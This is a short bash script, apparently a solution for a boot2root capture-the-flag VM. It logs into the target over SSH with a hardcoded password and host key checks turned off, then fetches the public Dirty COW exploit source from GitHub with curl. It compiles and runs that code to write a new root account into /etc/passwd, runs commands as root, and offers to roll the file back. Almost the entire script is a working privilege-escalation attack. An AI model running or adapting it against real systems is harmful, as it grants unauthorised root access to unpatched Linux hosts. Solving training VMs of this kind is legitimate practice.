#!/bin/bash

CURDIR=`dirname "$(readlink -f "$0")"`

USER="zaz"
PASS="646da671ca01bb5d84dbb5fb2238dc8e"
B2R_PORT=22

ROOT_DEFAULT="firefart"
ROOT_USER="dirtycow"
ROOT_PASS="AAAA"

if [ -z ${B2R_HOST+x} ]; then read -p "VM Host: " B2R_HOST; fi

if dpkg -s sshpass >/dev/null 2>&1; then
    export SSHPASS=$PASS
    SSHP="sshpass -e"
fi

echo -e "$USER password is: $PASS\n"

# Add dirtycow in /etc/passwd
(set -x
	$SSHP \
	ssh -q -o StrictHostKeyChecking=no $USER@$B2R_HOST -p $B2R_PORT 'bash -x' <<- EOI
		curl -s https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c > dirty.c
		sed -i "s/$ROOT_DEFAULT/$ROOT_USER/g" dirty.c
		gcc -pthread dirty.c -o dirty -lcrypt
		./dirty $ROOT_PASS
	EOI
)

execAsRoot() {
	cmd=$1
	(set -x
	    $SSHP \
	    ssh -q -tt -o StrictHostKeyChecking=no $USER@$B2R_HOST -p $B2R_PORT \
			"su $ROOT_USER -c '$cmd'"
	)
}

echo -e "\n$ROOT_USER password is: $ROOT_PASS\n"

# Get id
execAsRoot "id"

# Clean
echo && read -p "Rollback /etc/passwd ? [yY] " -n 1 -r
if [[ $REPLY =~ ^[yY]$ ]]; then
    echo
	execAsRoot "mv /tmp/passwd.bak /etc/passwd"
fi
